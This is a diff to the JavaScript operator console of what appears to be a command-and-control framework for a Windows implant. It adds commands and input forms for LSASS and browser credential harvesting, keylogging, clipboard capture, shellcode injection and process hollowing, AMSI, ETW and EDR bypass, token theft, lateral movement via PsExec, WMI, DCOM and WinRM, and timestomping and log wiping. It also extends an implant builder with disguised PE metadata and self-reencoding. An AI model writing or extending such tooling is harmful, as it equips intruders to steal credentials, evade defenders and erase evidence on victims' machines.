@@ -56,7 +56,7 @@
     const sel = $("agent-select");
     const prevSel = sel.value;
     if (!agents.length) {
-      tbody.innerHTML = '<tr><td colspan="4" class="muted">No agents connected.</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="5" class="muted">No agents connected.</td></tr>';
       sel.innerHTML = "";
       return;
     }
@@ -64,7 +64,8 @@
       `<tr><td><code>${escapeHtml(a.agent_id)}</code></td>` +
       `<td>${escapeHtml(a.hostname)}</td>` +
       `<td>${escapeHtml(a.peer)}</td>` +
-      `<td>${fmtTime(a.last_seen)}</td></tr>`
+      `<td>${fmtTime(a.last_seen)}</td>` +
+      `<td>${escapeHtml(a.os || "—")}</td></tr>`
     ).join("");
     sel.innerHTML = agents.map(a => `<option value="${escapeAttr(a.agent_id)}">${escapeHtml(a.agent_id)}</option>`).join("");
     if (agents.find(a => a.agent_id === prevSel)) sel.value = prevSel;
@@ -119,7 +120,15 @@
   function appendAudit(ev) {
     const line = `[${new Date(ev.timestamp * 1000).toISOString()}] ${ev.user} ${ev.action} -> ${ev.agent_id} (${ev.outcome === "Success" ? "ok" : "fail"}) ${ev.details}`;
     const el = $("audit");
-    el.textContent = (line + "\n" + el.textContent).split("\n").slice(0, 200).join("\n");
+    const filter = $("audit-filter") ? $("audit-filter").value.toLowerCase() : "";
+    if (!filter || line.toLowerCase().includes(filter)) {
+      el.textContent = (line + "\n" + el.textContent).split("\n").slice(0, 500).join("\n");
+      const cntEl = $("audit-count");
+      if (cntEl) {
+        const count = el.textContent.split("\n").filter(l => l.trim()).length;
+        cntEl.textContent = count + " entries";
+      }
+    }
   }
 
   // ── Modal dialog system ───────────────────────────────────────────
@@ -205,7 +214,6 @@
       case "Ping": return "Ping";
       case "GetSystemInfo": return "GetSystemInfo";
       case "ListProcesses": return "ListProcesses";
-      case "DiscoverNetwork": return "DiscoverNetwork";
       case "CaptureScreen": return "CaptureScreen";
       case "StartHciLogging": return "StartHciLogging";
       case "StopHciLogging": return "StopHciLogging";
@@ -215,6 +223,32 @@
       case "DisablePersistence": return "DisablePersistence";
       case "ListPlugins": return "ListPlugins";
       case "Shutdown": return "Shutdown";
+      case "Rev2Self": return "Rev2Self";
+      case "GetSystem": return "GetSystem";
+      case "LSAWhispererStatus": return "LSAWhispererStatus";
+      case "LSAWhispererStop": return "LSAWhispererStop";
+      case "UnhookNtdll": return "UnhookNtdll";
+      case "EvanescoStatus": return "EvanescoStatus";
+      case "KernelCallbackScan": return "KernelCallbackScan";
+      case "KernelCallbackRestore": return "KernelCallbackRestore";
+      case "EvasionTransformScan": return "EvasionTransformScan";
+      case "EvasionTransformRun": return "EvasionTransformRun";
+      case "CetStatus": return "CetStatus";
+      case "RevertToken": return "RevertToken";
+      case "ListTokens": return "ListTokens";
+      case "DisablePrefetch": return "DisablePrefetch";
+      case "RestorePrefetch": return "RestorePrefetch";
+      case "SyncTimestamps": return "SyncTimestamps";
+      case "SandboxCheck": return "SandboxCheck";
+      case "EdrBypassStatus": return "EdrBypassStatus";
+      case "MorphNow": return { MorphNow: { seed: parseInt(args.seed, 10) || 0 } };
+      case "KeyloggerDump": return "KeyloggerDump";
+      case "KeyloggerStop": return "KeyloggerStop";
+      case "ClipboardGet": return "ClipboardGet";
+      case "ClipboardMonitorDump": return "ClipboardMonitorDump";
+      case "ClipboardMonitorStop": return "ClipboardMonitorStop";
+      case "ListTopology": return "ListTopology";
+      case "ListLinks": return "ListLinks";
 
       // ── Single-string-arg commands ──
       case "ListDirectory": return { ListDirectory: { path: args.path } };
@@ -226,18 +260,16 @@
       case "GetPluginInfo": return { GetPluginInfo: { plugin_id: args.plugin_id } };
       case "JobStatus": return { JobStatus: { job_id: args.job_id } };
 
-      // ── WriteFile: path + base64 content ──
+      // ── WriteFile: path + content bytes ──
       case "WriteFile": return { WriteFile: { path: args.path, content: Array.from(new TextEncoder().encode(args.content)) } };
 
       // ── DownloadModule: module_id + optional repo_url ──
       case "DownloadModule": {
-        const payload = { module_id: args.module_id };
-        if (args.repo_url) payload.repo_url = args.repo_url;
-        else payload.repo_url = null;
-        return { DownloadModule: payload };
+        const dl = { module_id: args.module_id, repo_url: args.repo_url || null };
+        return { DownloadModule: dl };
       }
 
-      // ── ExecutePluginBinary: plugin_id + base64 input ──
+      // ── ExecutePluginBinary ──
       case "ExecutePluginBinary":
         return { ExecutePluginBinary: { plugin_id: args.plugin_id, input_data: Array.from(new TextEncoder().encode(args.input_data || "")) } };
 
@@ -246,19 +278,71 @@
       case "SimulateMouse": return { SimulateMouse: { x: parseInt(args.x, 10) || 0, y: parseInt(args.y, 10) || 0 } };
       case "MigrateAgent": return { MigrateAgent: { target_pid: parseInt(args.target_pid, 10) || 0 } };
       case "SetReencodeSeed": return { SetReencodeSeed: { seed: parseInt(args.seed, 10) || 0 } };
-      case "MorphNow": return { MorphNow: { seed: parseInt(args.seed, 10) || 0 } };
+
+      // ── Screenshot with optional monitor index ──
+      case "Screenshot": return { Screenshot: { monitor: parseInt(args.monitor, 10) || 0 } };
+
+      // ── Keylogger ──
+      case "KeyloggerStart": return { KeyloggerStart: { interval_ms: parseInt(args.interval_ms, 10) || 1000 } };
+
+      // ── Clipboard Monitor ──
+      case "ClipboardMonitorStart": return { ClipboardMonitorStart: { interval_ms: parseInt(args.interval_ms, 10) || 2000 } };
+
+      // ── Network Discovery sub-ops ──
+      case "NetArpScan": return { NetworkDiscovery: { operation: "arp_scan" } };
+      case "NetPingSweep": return { NetworkDiscovery: { operation: { ping_sweep: { subnet: args.subnet, timeout_ms: parseInt(args.timeout_ms, 10) || 3000, max_concurrent: parseInt(args.max_concurrent, 10) || 64 } } } };
+      case "NetTcpScan": return { NetworkDiscovery: { operation: { tcp_port_scan: { host: args.host, ports: (args.ports || "80,443,22,445").split(",").map(p => parseInt(p.trim(), 10)).filter(p => p > 0), concurrency: parseInt(args.concurrency, 10) || 128, timeout_ms: parseInt(args.timeout_ms, 10) || 3000 } } } };
+      case "NetReverseDns": return { NetworkDiscovery: { operation: { reverse_dns: { ip: args.ip } } } };
+      case "NetAdSrv": return { NetworkDiscovery: { operation: { ad_srv_discovery: { domain: args.domain } } } };
+
+      // ── Credential Harvesting ──
+      case "HarvestLSASS": return "HarvestLSASS";
+      case "HarvestLSA": return { HarvestLSA: { method: args.method || "auto" } };
+      case "BrowserData": return { BrowserData: { browser: args.browser || "all", data_type: args.data_type || "all" } };
 
       // ── Token Manipulation ──
       case "MakeToken": return { MakeToken: { username: args.username, password: args.password, domain: args.domain || ".", logon_type: parseInt(args.logon_type, 10) || 2 } };
       case "StealToken": return { StealToken: { target_pid: parseInt(args.target_pid, 10) || 0 } };
-      case "Rev2Self": return "Rev2Self";
-      case "GetSystem": return "GetSystem";
+      case "ImpersonatePipe": return { ImpersonatePipe: { pipe_name: args.pipe_name || "" } };
 
       // ── Lateral Movement ──
       case "PsExec": return { PsExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
       case "WmiExec": return { WmiExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
       case "DcomExec": return { DcomExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
       case "WinRmExec": return { WinRmExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
+
+      // ── Injection Engine ──
+      case "UnifiedInject": return { UnifiedInject: { target_process: args.target_process, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), technique: args.technique || null, evade: true } };
+      case "TransactedHollow": return { TransactedHollow: { target_process: args.target_process, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), etw_blinding: args.etw_blinding === "true" } };
+      case "DelayedStomp": return { DelayedStomp: { target_pid: parseInt(args.target_pid, 10) || 0, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), delay_secs: args.delay_secs ? parseInt(args.delay_secs, 10) : null } };
+      case "InjectSideLoad": return { InjectSideLoad: { pid: parseInt(args.pid, 10) || 0, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), export_config: { forward_to: args.forward_to || "kernel32.dll", exports: [] } } };
+      case "ExecuteAssembly": return { ExecuteAssembly: { assembly_data: Array.from(new TextEncoder().encode(args.assembly_data || "")), args: (args.args || "").split(" ").filter(Boolean) } };
+      case "ExecuteBOF": return { ExecuteBOF: { bof_data: Array.from(new TextEncoder().encode(args.bof_data || "")), args: [] } };
+
+      // ── Advanced Evasion ──
+      case "SetSleepVariant": return { SetSleepVariant: { variant: args.variant || "auto" } };
+      case "AmsiBypassMode": return { AmsiBypassMode: { mode: args.mode || "auto" } };
+      case "EvanescoSetThreshold": return { EvanescoSetThreshold: { idle_ms: parseInt(args.idle_ms, 10) || 5000 } };
+      case "KernelCallbackNuke": return { KernelCallbackNuke: { drivers: [] } };
+      case "SyscallEmulationToggle": return { SyscallEmulationToggle: { enabled: args.enabled === "true" } };
+
+      // ── P2P Mesh ──
+      case "LinkAgents": return { LinkAgents: { agent_a: args.agent_a, agent_b: args.agent_b } };
+      case "UnlinkAgent": return { UnlinkAgent: { agent_id: args.agent_id } };
+      case "LinkTo": return { LinkTo: { parent: args.parent } };
+      case "Unlink": return "Unlink";
+      case "MeshConnect": return { MeshConnect: { peer: args.peer } };
+      case "MeshDisconnect": return { MeshDisconnect: { peer: args.peer } };
+      case "MeshKillSwitch": return "MeshKillSwitch";
+      case "MeshQuarantine": return { MeshQuarantine: { peer: args.peer } };
+      case "MeshClearQuarantine": return { MeshClearQuarantine: { peer: args.peer } };
+      case "MeshSetCompartment": return { MeshSetCompartment: { compartment: args.compartment } };
+
+      // ── Forensic Cleanup ──
+      case "CleanPrefetch": return { CleanPrefetch: { exe_name: args.exe_name || "" } };
+      case "Timestomp": return { Timestomp: { file_path: args.file_path, reference_file: args.reference_file || "" } };
+      case "TimestompDirectory": return { TimestompDirectory: { dir_path: args.dir_path, reference_file: args.reference_file || "" } };
+      case "CleanUsn": return { CleanUsn: { volume: args.volume || "" } };
 
       default: return "Ping";
     }
@@ -301,14 +385,44 @@
     MorphNow: [{ id: "seed", label: "Seed (u64)", placeholder: "987654321" }],
     JobStatus: [{ id: "job_id", label: "Job ID", placeholder: "uuid" }],
 
+    // ── Surveillance ──
+    Screenshot: [{ id: "monitor", label: "Monitor Index (0 = primary)", placeholder: "0" }],
+    KeyloggerStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "1000" }],
+    ClipboardMonitorStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "2000" }],
+
+    // ── Network Discovery ──
+    NetPingSweep: [
+      { id: "subnet", label: "Subnet (CIDR or prefix)", placeholder: "192.168.1.0/24" },
+      { id: "timeout_ms", label: "Timeout (ms)", placeholder: "3000" },
+      { id: "max_concurrent", label: "Max concurrent probes", placeholder: "64" },
+    ],
+    NetTcpScan: [
+      { id: "host", label: "Target IP", placeholder: "192.168.1.1" },
+      { id: "ports", label: "Ports (comma-separated)", placeholder: "22,80,443,445,3389" },
+      { id: "concurrency", label: "Concurrency", placeholder: "128" },
+      { id: "timeout_ms", label: "Timeout (ms)", placeholder: "3000" },
+    ],
+    NetReverseDns: [{ id: "ip", label: "IP Address", placeholder: "192.168.1.1" }],
+    NetAdSrv: [{ id: "domain", label: "Domain", placeholder: "corp.example.com" }],
+
+    // ── Credential Harvesting ──
+    HarvestLSA: [
+      { id: "method", label: "Method (untrusted / ssp_inject / auto)", placeholder: "auto" },
+    ],
+    BrowserData: [
+      { id: "browser", label: "Browser (chrome / edge / firefox / all)", placeholder: "all" },
+      { id: "data_type", label: "Data Type (credentials / cookies / all)", placeholder: "all" },
+    ],
+
     // ── Token Manipulation ──
     MakeToken: [
       { id: "username", label: "Username", placeholder: "admin" },
       { id: "password", label: "Password", placeholder: "P@ssw0rd" },
       { id: "domain", label: "Domain", placeholder: "." },
-      { id: "logon_type", label: "Logon Type (2=Interactive,3=Network,9=NewCreds)", placeholder: "2" },
+      { id: "logon_type", label: "Logon Type (2=Interactive, 3=Network, 9=NewCreds)", placeholder: "2" },
     ],
     StealToken: [{ id: "target_pid", label: "Target PID", placeholder: "1234" }],
+    ImpersonatePipe: [{ id: "pipe_name", label: "Pipe Name (empty = random)", placeholder: "\\\\.\\pipe\\status" }],
 
     // ── Lateral Movement ──
     PsExec: [
@@ -335,24 +449,100 @@
       { id: "username", label: "Username (optional)", placeholder: "admin" },
       { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
     ],
+
+    // ── Injection Engine ──
+    UnifiedInject: [
+      { id: "target_process", label: "Target Process Name", placeholder: "svchost.exe" },
+      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "technique", label: "Technique (auto / ProcessHollow / ModuleStomp / ...)", placeholder: "auto" },
+    ],
+    TransactedHollow: [
+      { id: "target_process", label: "Target Process Name", placeholder: "notepad.exe" },
+      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "etw_blinding", label: "ETW Blinding (true / false)", placeholder: "true" },
+    ],
+    DelayedStomp: [
+      { id: "target_pid", label: "Target PID", placeholder: "1234" },
+      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "delay_secs", label: "Delay override seconds (optional)", placeholder: "" },
+    ],
+    InjectSideLoad: [
+      { id: "pid", label: "Target PID", placeholder: "1234" },
+      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "forward_to", label: "Export forward DLL", placeholder: "kernel32.dll" },
+    ],
+    ExecuteAssembly: [
+      { id: "assembly_data", label: "Assembly (.NET PE, hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "args", label: "Arguments (space-separated)", placeholder: "--arg1 --arg2" },
+    ],
+    ExecuteBOF: [
+      { id: "bof_data", label: "BOF/COFF data (hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
+    ],
+
+    // ── Advanced Evasion ──
+    SetSleepVariant: [
+      { id: "variant", label: "Variant (auto / timer_queue / apc / fiber / heavy_fiber / heap_encrypt)", placeholder: "auto" },
+    ],
+    AmsiBypassMode: [
+      { id: "mode", label: "Mode (hwbp / memory_patch / write_raid / auto)", placeholder: "auto" },
+    ],
+    EvanescoSetThreshold: [{ id: "idle_ms", label: "Idle threshold (ms)", placeholder: "5000" }],
+    SyscallEmulationToggle: [
+      { id: "enabled", label: "Enable emulation (true / false)", placeholder: "true" },
+    ],
+
+    // ── P2P Mesh ──
+    LinkAgents: [
+      { id: "agent_a", label: "Agent A ID", placeholder: "uuid-a" },
+      { id: "agent_b", label: "Agent B ID", placeholder: "uuid-b" },
+    ],
+    UnlinkAgent: [{ id: "agent_id", label: "Agent ID to unlink", placeholder: "uuid" }],
+    LinkTo: [{ id: "parent", label: "Parent agent ID or address", placeholder: "uuid-or-host:port" }],
+    MeshConnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
+    MeshDisconnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
+    MeshQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
+    MeshClearQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
+    MeshSetCompartment: [{ id: "compartment", label: "Compartment name", placeholder: "red-team" }],
+
+    // ── Forensic Cleanup ──
+    CleanPrefetch: [{ id: "exe_name", label: "Executable name (empty = all)", placeholder: "cmd.exe" }],
+    Timestomp: [
+      { id: "file_path", label: "Target file path", placeholder: "C:\\Windows\\Temp\\file.exe" },
+      { id: "reference_file", label: "Reference file (empty = ntdll.dll)", placeholder: "" },
+    ],
+    TimestompDirectory: [
+      { id: "dir_path", label: "Target directory", placeholder: "C:\\Windows\\Temp" },
+      { id: "reference_file", label: "Reference file (empty = ntdll.dll)", placeholder: "" },
+    ],
+    CleanUsn: [{ id: "volume", label: "Volume path (empty = system volume)", placeholder: "C:" }],
   };
 
   /** Commands that require zero arguments (no modal needed). */
   const ZERO_ARG_CMDS = new Set([
-    "Ping", "GetSystemInfo", "ListProcesses", "DiscoverNetwork", "CaptureScreen",
+    "Ping", "GetSystemInfo", "ListProcesses", "CaptureScreen",
     "StartHciLogging", "StopHciLogging", "GetHciLogBuffer", "ReloadConfig",
     "EnablePersistence", "DisablePersistence", "ListPlugins", "Shutdown",
     "Rev2Self", "GetSystem",
+    "LSAWhispererStatus", "LSAWhispererStop", "UnhookNtdll",
+    "EvanescoStatus", "KernelCallbackScan", "KernelCallbackRestore",
+    "EvasionTransformScan", "EvasionTransformRun", "CetStatus",
+    "RevertToken", "ListTokens", "DisablePrefetch", "RestorePrefetch",
+    "SyncTimestamps", "SandboxCheck", "EdrBypassStatus",
+    "NetArpScan", "KeyloggerDump", "KeyloggerStop",
+    "ClipboardGet", "ClipboardMonitorDump", "ClipboardMonitorStop",
+    "ListTopology", "ListLinks", "Unlink", "MeshKillSwitch",
+    "HarvestLSASS",
   ]);
 
   async function handleCommand(cmdName) {
     const agentId = $("agent-select").value;
     if (!agentId) { alert("No agent selected."); return; }
 
-    // ── Shutdown requires explicit "yes" confirmation ──
-    if (cmdName === "Shutdown") {
-      const result = await showModal("Confirm Shutdown", [
-        { id: "confirm", label: 'Type "yes" to confirm agent shutdown:', placeholder: "yes" },
+    // ── Dangerous commands require explicit "yes" confirmation ──
+    const DANGER_CMDS = ["Shutdown", "MeshKillSwitch", "KernelCallbackNuke"];
+    if (DANGER_CMDS.includes(cmdName)) {
+      const result = await showModal("Confirm " + cmdName, [
+        { id: "confirm", label: 'Type "yes" to confirm:', placeholder: "yes" },
       ]);
       if (!result || result.confirm.toLowerCase() !== "yes") return;
     }
@@ -414,25 +604,23 @@
   const tabDash = $("tab-dash");
   const tabShell = $("tab-shell");
   const tabBuilder = $("tab-builder");
+  const tabLogs = $("tab-logs");
   const btnDash = $("tab-btn-dash");
   const btnShell = $("tab-btn-shell");
   const btnBuilder = $("tab-btn-builder");
+  const btnLogs = $("tab-btn-logs");
+  const allTabs = [tabDash, tabShell, tabBuilder, tabLogs];
+  const allBtns = [btnDash, btnShell, btnBuilder, btnLogs];
 
-  function activateTab(active, inactive1, inactive2, tabActive, tabInactive1, tabInactive2) {
-    tabActive.hidden = false;
-    tabInactive1.hidden = true;
-    tabInactive2.hidden = true;
-    active.className = "tab-btn active";
-    inactive1.className = "tab-btn";
-    inactive2.className = "tab-btn";
+  function activateTab(activeIdx) {
+    allTabs.forEach((t, i) => { t.hidden = i !== activeIdx; });
+    allBtns.forEach((b, i) => { b.className = i === activeIdx ? "tab-btn active" : "tab-btn"; });
   }
 
-  btnDash.addEventListener("click", () => activateTab(btnDash, btnShell, btnBuilder, tabDash, tabShell, tabBuilder));
-  btnShell.addEventListener("click", () => {
-    activateTab(btnShell, btnDash, btnBuilder, tabShell, tabDash, tabBuilder);
-    syncShellAgentSelect();
-  });
-  btnBuilder.addEventListener("click", () => activateTab(btnBuilder, btnDash, btnShell, tabBuilder, tabDash, tabShell));
+  btnDash.addEventListener("click", () => activateTab(0));
+  btnShell.addEventListener("click", () => { activateTab(1); syncShellAgentSelect(); });
+  btnBuilder.addEventListener("click", () => activateTab(2));
+  btnLogs.addEventListener("click", () => activateTab(3));
 
   function syncShellAgentSelect() {
     const src = $("agent-select");
@@ -575,8 +763,6 @@
 
   /**
    * Read current feature checkbox state.
-   * Names MUST match the Rust BuildFeatures struct fields:
-   *   persistence, direct_syscalls, remote_assist, stealth
    */
   function getFeatures() {
     return {
@@ -584,36 +770,83 @@
       direct_syscalls: $("feat-direct-syscalls").checked,
       remote_assist: $("feat-remote-assist").checked,
       stealth: $("feat-stealth").checked,
+      network_discovery: $("feat-network-discovery").checked,
+      forensic_cleanup: $("feat-forensic-cleanup").checked,
+      self_reencode: $("feat-self-reencode").checked,
+      http_transport: $("feat-http-transport").checked,
+      doh_transport: $("feat-doh-transport").checked,
+      ssh_transport: $("feat-ssh-transport").checked,
+      smb_pipe_transport: $("feat-smb-pipe-transport").checked,
+      evasion_transform: $("feat-evasion-transform").checked,
+      p2p: $("feat-p2p").checked,
+      stack_spoof: $("feat-stack-spoof").checked,
     };
   }
 
   /** Apply feature object to checkboxes (for profile import). */
   function setFeatures(f) {
-    $("feat-persistence").checked = !!f.persistence;
-    $("feat-direct-syscalls").checked = !!f.direct_syscalls;
-    $("feat-remote-assist").checked = !!f.remote_assist;
-    $("feat-stealth").checked = !!f.stealth;
+    const set = (id, val) => { const el = $(id); if (el) el.checked = !!val; };
+    set("feat-persistence", f.persistence);
+    set("feat-direct-syscalls", f.direct_syscalls);
+    set("feat-remote-assist", f.remote_assist);
+    set("feat-stealth", f.stealth);
+    set("feat-network-discovery", f.network_discovery);
+    set("feat-forensic-cleanup", f.forensic_cleanup);
+    set("feat-self-reencode", f.self_reencode);
+    set("feat-http-transport", f.http_transport);
+    set("feat-doh-transport", f.doh_transport);
+    set("feat-ssh-transport", f.ssh_transport);
+    set("feat-smb-pipe-transport", f.smb_pipe_transport);
+    set("feat-evasion-transform", f.evasion_transform);
+    set("feat-p2p", f.p2p);
+    set("feat-stack-spoof", f.stack_spoof);
   }
 
   async function submitBuild() {
     const os = $("build-os").value;
     const arch = $("build-arch").value;
+    const format = $("build-format").value;
     const host = $("build-host").value.trim();
     const port = parseInt($("build-port").value, 10);
+    const transport = $("build-transport").value;
     const pin = $("build-pin").value.trim();
     const key = $("build-key").value.trim();
     const outDir = $("build-output-dir").value.trim();
+    const sleepMs = parseInt($("build-sleep-ms").value, 10) || 5000;
+    const jitter = parseInt($("build-jitter").value, 10) || 20;
+    const killDate = $("build-kill-date").value || null;
+    const seed = $("build-seed").value.trim() || null;
 
     if (!host || !port || !pin || !key) {
       alert("Please fill in all connection details and encryption key.");
       return;
     }
 
+    if (!/^[0-9a-fA-F]{64}$/.test(pin)) {
+      alert("TLS fingerprint must be exactly 64 hexadecimal characters (SHA-256).");
+      return;
+    }
+
+    // Collect PE artifact kit fields (only relevant for Windows)
+    const versionInfo = (os === "windows") ? {
+      file_version: $("build-version").value.trim() || null,
+      file_description: $("build-filedesc").value.trim() || null,
+      company_name: $("build-company").value.trim() || null,
+      product_name: $("build-product").value.trim() || null,
+      original_filename: $("build-origfilename").value.trim() || null,
+    } : null;
+
     const req = {
-      os, arch,
+      os, arch, format, transport,
       features: getFeatures(),
       host, port, pin, key,
-      output_dir: outDir ? outDir : null,
+      sleep_ms: sleepMs,
+      jitter,
+      kill_date: killDate,
+      seed,
+      output_dir: outDir || null,
+      version_info: versionInfo,
+      manifest_preset: $("build-manifest").value || null,
     };
 
     $("build-download").hidden = true;
@@ -634,20 +867,44 @@
       if (!res.ok) {
         logEl.textContent += "Error: " + (resData.error || res.statusText);
         logEl.className = "err";
+        $("btn-build").disabled = false;
       } else {
-        logEl.textContent += "Build complete.\nJob ID: " + resData.job_id + "\n";
-        logEl.textContent += resData.log || "";
+        logEl.textContent += "Build queued.\nJob ID: " + resData.job_id + "\n";
         window.checkBuildStatus(resData.job_id);
       }
     } catch (e) {
       logEl.textContent += "\nRequest failed: " + e.message;
       logEl.className = "err";
-    } finally {
       $("btn-build").disabled = false;
     }
   }
 
   $("btn-build").addEventListener("click", submitBuild);
+
+  // ── Fetch TLS fingerprint from this server ─────────────────────
+  if ($("btn-fetch-pin")) {
+    $("btn-fetch-pin").addEventListener("click", async () => {
+      try {
+        const res = await api("/info/fingerprint");
+        if (res.ok) {
+          const data = await res.json();
+          $("build-pin").value = data.fingerprint || data.sha256 || "";
+        } else {
+          alert("Failed to fetch fingerprint: " + res.statusText);
+        }
+      } catch (e) {
+        alert("Fetch failed: " + e.message);
+      }
+    });
+  }
+
+  // ── Audit tab controls ─────────────────────────────────────────
+  if ($("btn-clear-audit")) {
+    $("btn-clear-audit").addEventListener("click", () => {
+      $("audit").textContent = "";
+      if ($("audit-count")) $("audit-count").textContent = "0 entries";
+    });
+  }
 
   if (token) {
     $("token").value = token;
@@ -692,12 +949,26 @@
     const profileData = {
       os: $("build-os").value,
       arch: $("build-arch").value,
+      format: $("build-format").value,
+      transport: $("build-transport").value,
       features: getFeatures(),
       host: $("build-host").value.trim(),
-      port: parseInt($("build-port").value, 10) || 443,
+      port: parseInt($("build-port").value, 10) || 8444,
       pin: $("build-pin").value.trim(),
       key: $("build-key").value.trim(),
-      output_dir: $("build-output-dir").value.trim() || undefined,
+      sleep_ms: parseInt($("build-sleep-ms").value, 10) || 5000,
+      jitter: parseInt($("build-jitter").value, 10) || 20,
+      kill_date: $("build-kill-date").value || null,
+      seed: $("build-seed").value.trim() || null,
+      output_dir: $("build-output-dir").value.trim() || null,
+      version_info: {
+        file_version: $("build-version").value.trim() || null,
+        file_description: $("build-filedesc").value.trim() || null,
+        company_name: $("build-company").value.trim() || null,
+        product_name: $("build-product").value.trim() || null,
+        original_filename: $("build-origfilename").value.trim() || null,
+      },
+      manifest_preset: $("build-manifest").value || null,
     };
 
     try {
@@ -749,6 +1020,8 @@
 
       if (data.os) $("build-os").value = data.os;
       if (data.arch) $("build-arch").value = data.arch;
+      if (data.format && $("build-format")) $("build-format").value = data.format;
+      if (data.transport && $("build-transport")) $("build-transport").value = data.transport;
       // Accept both old (syscalls/screencap/keylog) and new (direct_syscalls/remote_assist) keys
       if (data.features) {
         if (data.features.direct_syscalls !== undefined) {
@@ -767,7 +1040,21 @@
       if (data.port) $("build-port").value = data.port;
       if (data.pin) $("build-pin").value = data.pin;
       if (data.key) $("build-key").value = data.key;
-      if (data.output_dir !== undefined) $("build-output-dir").value = data.output_dir;
+      if (data.sleep_ms != null && $("build-sleep-ms")) $("build-sleep-ms").value = data.sleep_ms;
+      if (data.jitter != null && $("build-jitter")) $("build-jitter").value = data.jitter;
+      if (data.kill_date && $("build-kill-date")) $("build-kill-date").value = data.kill_date;
+      if (data.seed && $("build-seed")) $("build-seed").value = data.seed;
+      if (data.output_dir != null) $("build-output-dir").value = data.output_dir;
+      if (data.version_info) {
+        const vi = data.version_info;
+        const set = (id, v) => { const el = $(id); if (el && v) el.value = v; };
+        set("build-version", vi.file_version);
+        set("build-filedesc", vi.file_description);
+        set("build-company", vi.company_name);
+        set("build-product", vi.product_name);
+        set("build-origfilename", vi.original_filename);
+      }
+      if (data.manifest_preset && $("build-manifest")) $("build-manifest").value = data.manifest_preset;
 
       alert("Profile loaded successfully.");
     } catch (e) {
